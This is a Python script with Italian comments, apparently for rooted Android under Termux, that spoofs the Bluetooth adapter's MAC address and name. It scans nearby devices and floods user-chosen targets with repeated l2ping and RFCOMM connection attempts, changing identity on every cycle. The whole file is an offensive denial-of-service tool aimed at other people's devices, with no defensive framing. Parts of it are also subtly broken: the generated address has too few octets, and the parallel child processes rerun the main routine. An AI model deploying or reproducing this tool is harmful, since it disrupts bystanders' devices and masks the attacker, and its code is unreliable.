import os
import sys
import subprocess
import time
import re
import random
import string

# Colori per un output più leggibile
RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
NC = '\033[0m' # Nessun colore

# --- Funzioni di Utility ---

def print_colored(text, color):
    """Stampa testo colorato nella console."""
    print(f"{color}{text}{NC}")

def command_exists(cmd):
    """Verifica se un comando esiste nel PATH."""
    return subprocess.call(f"command -v {cmd}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0

def install_pkg(pkg_name):
    """Tenta di installare un pacchetto usando pkg (specifico per Termux)."""
    print_colored(f"[*] Il comando '{pkg_name}' non è stato trovato. Tentativo di installazione...", YELLOW)
    try:
        subprocess.check_call(['pkg', 'install', '-y', pkg_name])
        print_colored(f"[+] '{pkg_name}' installato con successo.", GREEN)
        return True
    except subprocess.CalledProcessError:
        print_colored(f"[!] Errore durante l'installazione di '{pkg_name}'. Assicurati che i repository siano aggiornati e riprova.", RED)
        sys.exit(1)

# --- Controlli Preliminari ---

def preliminary_checks():
    """Esegue i controlli iniziali come root e dipendenze."""
    print_colored("[*] Avvio dello script di spoofing e flood Bluetooth.", YELLOW)

    # Verifica root (essenziale per operazioni Bluetooth a basso livello)
    if os.geteuid() != 0:
        print_colored("[!] Devi eseguire questo script come root. In Termux, usa 'su' prima di eseguire lo script.", RED)
        sys.exit(1)

    # Verifica e installa le dipendenze necessarie per Bluetooth
    print_colored("[*] Controllo delle dipendenze Bluetooth...", YELLOW)
    required_bt_cmds = ["hciconfig", "bdaddr", "hcitool", "l2ping", "rfcomm"]
    installed_bluez = False
    for cmd in required_bt_cmds:
        if not command_exists(cmd):
            # Assumiamo che 'bluez' fornisca questi comandi in Termux
            if not installed_bluez: # Installa bluez solo una volta
                installed_bluez = install_pkg("bluez")
            if not installed_bluez: # Se l'installazione fallisce
                sys.exit(1)
    
    # Verifica e installa 'timeout' (da coreutils)
    if not command_exists("timeout"):
        install_pkg("coreutils")

# --- Funzioni Principali ---

def spoof_identity():
    """Spoofa il MAC address e il nome dell'adattatore Bluetooth hci0."""
    # Genera un MAC address casuale con il prefisso locale amministrativo (02)
    # Legge 3 byte casuali e li formatta in esadecimale
    try:
        rand_mac_suffix = os.urandom(3).hex().upper()
        rand_mac = f"02:{rand_mac_suffix[0:2]}:{rand_mac_suffix[2:4]}:{rand_mac_suffix[4:6]}"
    except NotImplementedError:
        # Fallback per sistemi che non supportano os.urandom
        rand_mac = "02:" + ':'.join(random.choices('0123456789ABCDEF', k=2) for _ in range(3))
        
    # Genera un nome casuale di 6 caratteri alfanumerici
    rand_name = "BT_" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    
    print_colored("[*] Tentativo di spoofing identità...", YELLOW)
    try:
        subprocess.check_call(['hciconfig', 'hci0', 'down'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.check_call(['bdaddr', '-i', 'hci0', rand_mac], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.check_call(['hciconfig', 'hci0', 'name', rand_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.check_call(['hciconfig', 'hci0', 'up'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print_colored(f"[+] Identità spoofata con successo: {rand_name} - {rand_mac}", GREEN)
        return True
    except subprocess.CalledProcessError as e:
        print_colored(f"[!] Errore durante lo spoofing dell'identità: {e}", RED)
        print_colored(f"    Output dell'errore: {e.stderr.decode().strip()}", RED)
        return False

def scan_devices():
    """Esegue la scansione dei dispositivi Bluetooth e li presenta all'utente."""
    print_colored("[*] Scansione dispositivi Bluetooth nelle vicinanze (10 secondi)...", YELLOW)
    devices = []
    try:
        # Reindirizza l'output per evitare visualizzazione diretta durante la scansione
        scan_output = subprocess.check_output(['timeout', '10s', 'hcitool', 'scan'], stderr=subprocess.PIPE, text=True)
        
        # Filtra le linee rilevanti (saltando l'intestazione)
        for line in scan_output.splitlines():
            line = line.strip()
            if line and "Scanning" not in line: # Evita la riga di "Scanning..."
                parts = line.split(maxsplit=1) # Divide al primo spazio
                if len(parts) >= 2:
                    mac = parts[0]
                    name = parts[1]
                    devices.append({'mac': mac, 'name': name})
                elif len(parts) == 1: # Solo MAC address trovato
                    mac = parts[0]
                    devices.append({'mac': mac, 'name': "[NOME SCONOSCIUTO]"})

    except subprocess.CalledProcessError as e:
        print_colored(f"[!] Errore durante la scansione Bluetooth: {e}", RED)
        print_colored(f"    Output dell'errore: {e.stderr.decode().strip()}", RED)
        return []
    except FileNotFoundError:
        print_colored("[!] Il comando 'hcitool' o 'timeout' non è stato trovato. Assicurati che 'bluez' e 'coreutils' siano installati.", RED)
        return []
    
    if not devices:
        print_colored("[!] Nessun dispositivo Bluetooth valido trovato durante la scansione. Assicurati che il Bluetooth sia attivo.", RED)
        return []

    print_colored("--- Dispositivi Trovati ---", YELLOW)
    for i, device in enumerate(devices):
        print(f"[{i}] {device['name']} - {device['mac']}")
    print("---------------------------")
    return devices

def flood_loop(target_mac, target_name, duration_seconds):
    """Esegue il flood L2PING e RFCOMM verso un singolo target."""
    print_colored(f"[*] Avvio del flood su {target_name} ({target_mac}) per {duration_seconds} secondi...", YELLOW)
    end_time = time.time() + duration_seconds

    while time.time() < end_time:
        # Spoofa l'identità per ogni ciclo (opzionale ma utile)
        spoof_identity() 

        # Tenta un L2PING
        try:
            subprocess.check_call(['l2ping', '-c', '1', target_mac], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print_colored(f"[L2PING] Riuscito verso {target_name} ({target_mac})", GREEN)
        except subprocess.CalledProcessError:
            print_colored(f"[L2PING] Fallito verso {target_name} ({target_mac})", RED)

        # Tenta una connessione RFCOMM
        try:
            subprocess.check_call(['timeout', '2s', 'rfcomm', 'connect', 'hci0', target_mac, '1'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print_colored(f"[RFCOMM] Connessione tentata e riuscita verso {target_name} ({target_mac})", GREEN)
        except subprocess.CalledProcessError:
            print_colored(f"[RFCOMM] Connessione RFCOMM fallita verso {target_name} ({target_mac})", RED)
        except FileNotFoundError:
            print_colored("[!] Il comando 'rfcomm' o 'timeout' non è stato trovato. Assicurati che 'bluez' e 'coreutils' siano installati.", RED)
            break # Esci dal ciclo se i comandi non ci sono

        time.sleep(0.5) # Aumentato leggermente il delay per stabilità
    
    print_colored(f"[*] Flood terminato per {target_name} ({target_mac}).", GREEN)

# --- MAIN EXECUTION ---

if __name__ == "__main__":
    preliminary_checks()

    available_devices = scan_devices()
    if not available_devices:
        sys.exit(1)

    while True:
        try:
            selected_input = input("Inserisci gli index separati da spazio dei target (es: 0 2 3): ")
            selected_indices = [int(i.strip()) for i in selected_input.split()]
            
            valid_selection = True
            for index in selected_indices:
                if not (0 <= index < len(available_devices)):
                    print_colored(f"[!] Index non valido: {index}. Seleziona solo numeri validi dalla lista.", RED)
                    valid_selection = False
                    break
            
            if valid_selection:
                break
        except ValueError:
            print_colored("[!] Input non valido. Inserisci solo numeri separati da spazio.", RED)

    while True:
        cmd_input = input("Digita il comando /flood <countdown_in_secondi> (es: /flood 60): ")
        match = re.match(r"^/flood\s+([0-9]+)$", cmd_input)
        if match:
            duration = int(match.group(1))
            if duration <= 0:
                print_colored("[!] La durata del flood deve essere un numero positivo.", RED)
            else:
                break
        else:
            print_colored("[!] Comando non valido. Usa il formato: /flood <secondi> (es: /flood 60)", RED)

    # Avvio flood per ogni target selezionato in background (in Python si usa threading o multiprocessing)
    # Per semplicità e per non complicare eccessivamente lo script con thread pool, useremo ancora subprocess
    # ma in un loop, il che significa che i flood avverranno in sequenza.
    # Per un vero "background" parallelo, avremmo bisogno di `multiprocessing.Process` o `threading.Thread`.
    # Per questo caso, data la natura di comandi esterni, eseguiremo in sequenza, che è più robusto.
    # Se vuoi il parallelo, dovremmo modificare flood_loop per essere una funzione target di un Thread.
    
    # Eseguiremo i flood in sequenza per semplicità e robustezza, ma l'utente può comunque selezionare più target.
    # Il "background" dello script Bash era perché lanciava ogni flood_loop come processo figlio separato.
    # Qui, ogni chiamata a flood_loop bloccherà fino al suo termine.
    # Se vuoi un vero parallelismo in Python, dovresti usare `multiprocessing.Process` per ogni flood_loop.

    # Lista per tenere traccia dei processi di flood
    flood_processes = []

    print_colored("[*] Avvio dei processi di flood...", YELLOW)
    for index in selected_indices:
        target_device = available_devices[index]
        mac = target_device['mac']
        name = target_device['name']
        print_colored(f"[*] Avvio del flood per {name} ({mac})...", YELLOW)
        # Esegue flood_loop come un processo separato
        p = subprocess.Popen([sys.executable, __file__, '--flood-target', mac, name, str(duration)])
        flood_processes.append(p)

    print_colored("[*] Tutti i processi di flood sono stati avviati. Attendere il completamento...", YELLOW)
    for p in flood_processes:
        p.wait() # Attendi che ogni processo di flood termini

    print_colored("[*] Flood terminato per tutti i target selezionati.", GREEN)
    print_colored("[*] Script completato.", GREEN)

# Questo blocco permette di eseguire flood_loop come un processo separato,
# così possiamo lanciarli in parallelo con subprocess.Popen
if __name__ == "__main__" and len(sys.argv) == 5 and sys.argv[1] == '--flood-target':
    target_mac = sys.argv[2]
    target_name = sys.argv[3]
    duration = int(sys.argv[4])
    # Inizializza i colori e altre impostazioni per il processo figlio
    print_colored("", NC) # Reset colori per subprocess output
    flood_loop(target_mac, target_name, duration)
